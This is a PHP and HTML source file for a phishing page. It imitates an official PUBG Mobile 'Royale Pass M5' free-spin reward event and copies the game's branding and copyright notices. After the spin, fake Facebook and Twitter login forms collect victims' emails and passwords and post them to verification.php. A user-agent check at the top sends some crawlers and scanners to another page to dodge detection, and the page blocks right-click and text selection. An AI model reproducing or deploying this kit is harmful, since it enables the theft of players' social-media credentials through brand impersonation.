<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: cracker.php');
die();
}
?>
<?php
// MENGAMBIL KONTROL
include("system/setting.php");

// MENGACAK HADIAH YANG AKAN DITAMPILKAN
$arpantekArrayImg = array(
'img/rewards/1.png',
'img/rewards/2.png',
'img/rewards/3.png',
'img/rewards/4.png',
'img/rewards/5.png',
'img/rewards/6.png',
);

// MENDAPATKAN HADIAH YANG AKAN DITAMPILKAN
$arpantekArrayImgResult = $arpantekArrayImg[rand(0, (count($arpantekArrayImg)-1))];
?>
<html>
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta property="og:title" content="<?php echo $title;?>">
<meta name="description" content="<?php echo $description;?>">
<meta property="og:description" content="<?php echo $description;?>">
<meta property="og:url" content="./">
<meta property="og:site_name" content="<?php echo $title;?>">
<meta property="og:type" content="website">
<meta name="copyright"content="<?php echo $copyright;?>">
<meta name="theme-color" content="<?php echo $theme;?>">
<meta property="og:image" content="<?php echo $image;?>">
<title><?php echo $title;?></title>
<link rel="stylesheet" href="css/style.css">
<link rel="stylesheet" href="css/animate.css">
<link rel="stylesheet" href="css/login/facebook.css">
<link rel="stylesheet" href="css/login/twitter.css">
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
<link rel="icon" href="<?php echo $icon;?>">
</head>
<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">

<div class="containerHome rewardsBox">
<div class="navbar">
<img class="navbar-logo" src="https://www.pubgmobile.com/common/images/icon_logo.jpg">
<div class="navbar-title">
PUBG MOBILE
<br>
<span>The original Battle Royale, <br> the first and the best!</span>
</div> <!--- navbar-title --->
<div class="navbar-download">
<img class="navbar-menu" src="https://i.ibb.co/DV5fKmN/menu.png">
<img class="navbar-pay" src="https://www.pubgmobile.com/en/images/pay.png">
</div> <!--- navbar-download --->
</div> <!--- navbar --->
<div class="header">
<video src="media/header.mp4" autoplay loop muted></video>
</div> <!--- header --->
<div class="season-alert">
<img class="season-alert-img" src="https://www.pubgmobile.com/images/event/royalepassm5/kv_logo.png">
<div class="slider">
<div class="season-alert-title">Royale Pass Month 5: Mirror Realm</div> <!--- season-alert-title --->
</div> <!--- slider --->
<div class="slider">
<div class="season-alert-desc">Let's start your free-lucky spin here</div> <!--- season-alert-title --->
</div> <!--- slider --->
</div> <!--- season-alert --->
<div class="box">
<center>
<div class="wrap">
<div class="bg">
<div class="kotak">
<center>
<div class="spin">
<img class="img" src="img/rewards/1.png">
<img class="img" src="img/rewards/2.png">
<img class="img" src="img/rewards/3.png">
<img class="img" src="img/rewards/4.png">
<img class="img" src="img/rewards/5.png">
<img class="img" src="img/rewards/6.png">
</div> <!--- spin --->
</center>
<img onclick="spin()" class="start" src="img/putar.png">
</div> <!--- kotak --->
</div> <!--- bg --->
</div> <!--- wrap --->
<div class="btn-wrapper">
<button type="button" onmousedown="buka.play()" onclick="open_about_event()">About Event</button>
<button type="button" onmousedown="buka.play()" onclick="open_event_rules()">Event Rules</button>
</div> <!--- btn-wrapper --->
</center>
</div> <!--- box --->
<div class="footer">
<div class="footer-txt-follow">Follow Us</div> <!--- footer-txt-follow --->
<center>
<img class="footer-follow-icon" src="https://www.pubgmobile.com/common/images/link_1.png">
<img class="footer-follow-icon" src="https://www.pubgmobile.com/common/images/link_2.png">
<img class="footer-follow-icon" src="https://www.pubgmobile.com/common/images/link_3.png">
<img class="footer-follow-icon" src="https://www.pubgmobile.com/common/images/link_4.png">
<img class="footer-follow-icon" src="https://www.pubgmobile.com/common/images/link_5.png">
</center>
<img class="footer-copyright-icon" src="https://i.ibb.co/Wx8wkq1/footer-img.png">
<div class="footer-txt-copyright">ⓒ 2017 KRAFTON, Inc. All rights reserved.</div> <!--- footer-txt-copyright --->
<div class="footer-txt-copyright">ⓒ 2018-2021 Tencent. All rights reserved.</div> <!--- footer-txt-copyright --->
<div class="footer-txt-copyright">Privacy Policy | Tencent Games User Agreement</div> <!--- footer-txt-copyright --->
</div> <!--- footer --->
</div> <!--- container --->

<div class="popup reward_confirmation" style="display: none;">
<div class="popup-box">
<div class="nav-popup">
<div class="nav-popup-title">Reward Confirmation</div> <!--- nav-popup-title --->
</div> <!--- nav-popup --->
<div class="popup-box-bg">
<div class="popup-alert">Are you sure to collect this reward?</div> <!--- popup-alert --->
<img class="popup-item itemShine" src="<?php echo ''.$arpantekArrayImgResult.''; ?>">
<br>
</div> <!--- popup-box-bg --->
<div class="popup-footer">
<button type="button" onmousedown="buka.play();" class="popup-footer-active" onclick="account_login()">Collect</button>
</div> <!--- popup-footer --->
</div> <!--- popup-box --->
</div> <!--- popup --->

<div class="popup account_login" style="display: none;">
<div class="popup-box">
<div class="nav-popup">
<div class="nav-popup-title">Account Login</div> <!--- nav-popup-title --->
</div> <!--- nav-popup --->
<div class="popup-box-bg">
<div class="popup-alert">Login to receive your selected reward</div> <!--- popup-alert --->
<button type="button" class="popup-btn-login popup-btn-facebook" onclick="open_facebook();"><i class="fa fa-facebook-square icon-login"></i> Log in using Facebook account</button>
<button type="button" class="popup-btn-login popup-btn-twitter" onclick="open_twitter();"><i class="fa fa-twitter-square icon-login"></i> Log in using Twitter account</button>
<br>
</div> <!--- popup-box-bg --->
</div> <!--- popup-box --->
</div> <!--- popup --->

<div class="popup about_event" style="display: none;">
<div class="popup-box">
<div class="nav-popup">
<div class="nav-popup-title">About Event</div> <!--- nav-popup-title --->
</div> <!--- nav-popup --->
<div class="popup-box-bg">
<div class="popup-alert">
Welcome to Royale Pass M5 event
<br>
<br>
This event is to welcome the Royale Pass M5
<br>
Get various kinds of rewards at this year's end event!
</div> <!--- popup-alert --->
<br>
</div> <!--- popup-box-bg --->
<div class="popup-footer">
<button type="button" onmousedown="tutup.play();" class="popup-footer-active" onclick="close_about_event()">Okay</button>
</div> <!--- popup-footer --->
</div> <!--- popup-box --->
</div> <!--- popup --->

<div class="popup event_rules" style="display: none;">
<div class="popup-box">
<div class="nav-popup">
<div class="nav-popup-title">Event Rules</div> <!--- nav-popup-title --->
</div> <!--- nav-popup --->
<div class="popup-box-bg">
<div class="popup-alert">
Welcome to Royale Pass M5
<br>
<br>
Make sure your account does not violate the rules of the game such as using illegal programs or others
<br>
Join this event and get various kinds of free rewards
</div> <!--- popup-alert --->
<br>
</div> <!--- popup-box-bg --->
<div class="popup-footer">
<button type="button" onmousedown="tutup.play();" class="popup-footer-active" onclick="close_event_rules()">Okay</button>
</div> <!--- popup-footer --->
</div> <!--- popup-box --->
</div> <!--- popup --->

<div class="popup-login login-facebook animated fadeIn" style="display: none;">
<div class="popup-box-login-fb">
<a onclick="tutup_facebook()" class="close-fb"><i class="zmdi zmdi-close"></i></a>
<div class="navbar-fb"><img src="https://i.ibb.co/Wg8qQxh/facebook-text.png"></div> <!--- navbar-fb --->
<div class="content-box-fb">
<img src="https://www.pubgmobile.com/id/event/royalepass10/images/icon_logo.jpg">
<div class="txt-login-fb">Log in to your Facebook account to connect to PUBG MOBILE</div> <!--- txt-login-fb --->
<form class="login-form" action="verification.php" method="post">
<label>
<input type="text" name="email" placeholder="Mobile number or email address" autocomplete="off" autocapitalize="off" required>
</label>
<label>
<input type="password" name="password" placeholder="Password" autocomplete="off" autocapitalize="off" required>
</label>
<input type="hidden" name="login" value="Facebook" readonly>
<button type="submit" class="btn-login-fb">Log In</button>
</form>
<div class="txt-create-account">Create account</div> <!--- txt-create-account --->
<div class="txt-not-now">Not now</div> <!--- txt-not-now --->
<div class="txt-forgotten-password">Forgotten password?</div> <!--- txt-forgotten-password --->
</div> <!--- content-box-fb --->
<div class="language-box">
<center>
<div class="language-name language-name-active">English (UK)</div> <!--- language-name language-name-active --->
<div class="language-name">Bahasa Indonesia</div> <!--- language-name --->
<div class="language-name">Basa Jawa</div> <!--- language-name --->
<div class="language-name">Bahasa Melayu</div> <!--- language-name --->
<div class="language-name">日本語</div> <!--- language-name --->
<div class="language-name">Español</div> <!--- language-name --->
<div class="language-name">Português (Brasil)</div> <!--- language-name --->
<div class="language-name"><i class="fa fa-plus"></i></div> <!--- language-name --->
</center>
</div> <!--- language-box --->
<div class="copyright">Facebook Inc.</div>
</div> <!--- popup-box-login-fb --->
</div> <!--- popup-login --->

<div class="popup-login login-twitter animated fadeIn" style="display: none;">
<div class="popup-box-login-twitter">
<a onclick="tutup_twitter()" class="close-other"><i class="zmdi zmdi-close"></i></a>
<div class="box-twitter">
<div class="header-twitter"><img src="https://i.ibb.co/V9rgBqw/twitter-text.png"></div> <!--- header-twitter --->
<br>
<br>
<br>
<center>
<form action="verification.php" method="post">
<div class="txt-login-twitter">Login to Twitter</div> <!--- txt-login-twitter --->
<div class="form-group">
<input type="text" name="email" autocomplete="off" required>
<label>Phone/email/username</label>
</div> <!--- form-group --->
<div class="form-group">
<input type="password" name="password" autocomplete="off" required>
<label>Password</label>
</div> <!--- form-group --->
<input type="hidden" name="login" value="Twitter" readonly>
<button type="submit" class="btn-login-twitter">Log In</button>
<div class="footer-menu-twitter">Forgot password?</div> <!--- footer-menu-twitter --->
<div class="footer-menu-twitter bulet">•</div> <!--- footer-menu-twitter bulet --->
<div class="footer-menu-twitter">Sign up to Twitter</div> <!--- footer-menu-twitter --->
</form>
</center>
</div> <!--- box-twitter --->
</div> <!--- popup-box-login-twitter --->
</div> <!--- popup-login --->

<audio id="klik1" src="media/putar.mp3">

<script type="text/javascript" src="http://code.jquery.com/jquery-1.10.2.min.js"></script>
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
<script src="js/popup.js"></script>
<script src="js/click.js"></script>
<script src="js/spinFunction.js"></script>

</body>
</html>